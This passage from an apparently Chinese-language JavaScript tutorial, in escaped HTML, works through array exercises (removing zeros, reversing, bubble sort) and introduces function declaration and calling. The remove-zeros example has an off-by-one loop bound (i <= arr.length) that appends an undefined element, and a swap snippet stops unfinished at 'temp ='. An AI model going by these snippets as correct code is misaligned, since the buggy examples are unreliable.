&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
	&lt;span style=&#34;color:#75715e&#34;&gt;// 刚开始 newArr.length 就是0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;) {
            &lt;span style=&#34;color:#75715e&#34;&gt;// 新数组索引号应该从0开始，依次递增
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;)
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;86-数组案例&#34;&gt;8.6 数组案例&lt;/h2&gt;
&lt;h3 id=&#34;861-案例1删除制定数组元素&#34;&gt;8.6.1 案例1：删除制定数组元素&lt;/h3&gt;
&lt;p&gt;要求：将数组[2, 0, 6, 1, 77, 0, 25, 7]中的0去掉后，形成一个不包含0的新数组。&lt;/p&gt;
&lt;p&gt;案例分析：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需要一个新数组用于存放筛选之后的数据&lt;/li&gt;
&lt;li&gt;遍历原来的数组，把不是0的数据添加到新数组里面（此时要注意采用数组名+索引的格式接收数据）&lt;/li&gt;
&lt;li&gt;新数组里面的个数，用length不断累加&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;862-案例2翻转数组&#34;&gt;8.6.2 案例2：翻转数组&lt;/h3&gt;
&lt;p&gt;要求：将数组[&amp;lsquo;red&amp;rsquo;, &amp;lsquo;green&amp;rsquo;, &#39; blue&amp;rsquo;, &amp;lsquo;pink&amp;rsquo;, &amp;lsquo;purple&amp;rsquo;]的内容反过来存放&lt;/p&gt;
&lt;p&gt;输出：[&amp;lsquo;purple&amp;rsquo;, &amp;lsquo;pink&amp;rsquo;, &amp;lsquo;blue&amp;rsquo;, &#39; green&amp;rsquo;, &amp;lsquo;red&amp;rsquo;]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;案例分析：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510202530.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明一个新数组 newArr
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 2. 把旧数组索引号第4个取过来（arr.length-1），给新数组索引号第0个元素（newArr.length）
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 3. 我们采取递减的方式 i--
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;red&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;green&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; blue&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;purple&amp;#39;&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;) {
        &lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;];
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;newArr&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;863-案例3数组排序冒泡排序&#34;&gt;8.6.3 案例3：数组排序（冒泡排序）&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;冒泡排序：是一种算法，把一系列的数据按照一定的顺序进行排列显示（从小到大或从大到小）&lt;/li&gt;
&lt;li&gt;例如我们可以将数组[5, 4, 3, 2, 1]中的元素按照从小到大的顺序排序，输出：1，2，3，4，5&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 交换两个变量
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;pink&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;yellow&amp;#39;&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt;;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510203635.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 冒泡排序
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 外层循环管趟数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {	&lt;span style=&#34;color:#75715e&#34;&gt;// 里层循环管每一趟的次数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#75715e&#34;&gt;// 内部交换2个变量的值，前一个和后一个数组元素相比较
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]) {
                &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;];
                &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
                &lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;j&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;temp&lt;/span&gt;;
            }
        }
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;arr&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;9-函数&#34;&gt;9. 函数&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;能够说出为什么需要函数&lt;/li&gt;
&lt;li&gt;能够根据语法书写函数&lt;/li&gt;
&lt;li&gt;能够根据需求封装函数&lt;/li&gt;
&lt;li&gt;能够说出形参和实参的传递过程&lt;/li&gt;
&lt;li&gt;能够使用函数的返回值&lt;/li&gt;
&lt;li&gt;能够使用arguments获取函数的参数&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;91-函数的概念&#34;&gt;9.1 函数的概念&lt;/h2&gt;
&lt;p&gt;在 JS 里面，可能会定义非常多的相同代码或者功能相似的代码，这些代码可能需要大量重复使用。虽然 for 循环语句也能实现一些简单的重复操作，但是比较具有局限性，此时我们就可以使用 JS 中的函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数&lt;/strong&gt;：就是封装了一段&lt;strong&gt;可被重复调用执行的代码块&lt;/strong&gt;。通过此代码块可以实现大量代码的重复使用。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 3. 函数就是封装了一段可以被重复执行调用的代码块，目的：就是让大量代码重复使用
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num1&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;num2&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
            &lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;;
        }
        &lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;sum&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#a6e22e&#34;&gt;getSum&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;);
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;92-函数的使用&#34;&gt;9.2 函数的使用&lt;/h2&gt;
&lt;p&gt;函数在使用时分成两步：声明函数和调用函数&lt;/p&gt;
&lt;h3 id=&#34;921-声明函数&#34;&gt;9.2.1 声明函数&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 声明函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;函数名&lt;/span&gt;() {
    &lt;span style=&#34;color:#75715e&#34;&gt;// 函数体代码
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;function是声明函数的关键字，必须小写&lt;/li&gt;
&lt;li&gt;由于函数一般是为了实现某个功能才定义的，所以通常我们将函数命名为动词，比如getSum&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;922-调用函数&#34;&gt;9.2.2 调用函数&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 调用函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;函数名&lt;/span&gt;();	&lt;span style=&#34;color:#75715e&#34;&gt;// 通过调用函数名来执行函数体代码
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;调用的时候千万不要忘记添加小括号&lt;/li&gt;
&lt;li&gt;口诀：函数不调用，自己不执行&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;注意：声明函数本身并不会执行代码，只有调用函数时才会执行函数体代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;923-函数的封装&#34;&gt;9.2.3 函数的封装&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;函数的封装是把一个或者多个功能通过&lt;strong&gt;函数的方式封装起来&lt;/strong&gt;，对外只提供一个简单的函数接口&lt;/li&gt;
&lt;li&gt;简单理解：封装类似于将电脑配件整合组装到机箱中（类似快递打包）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://development-bj-01.oss-cn-beijing.aliyuncs.com/PicGo/20200510215813.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;
	&lt;span style=&#34;color:#75715e&#34;&gt;// 函数使用分为两步：声明函数 和 调用函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;// 1. 声明函数
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//function 函数名() {
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//    函数体
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//}
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sayHi&lt;/span&gt;() {
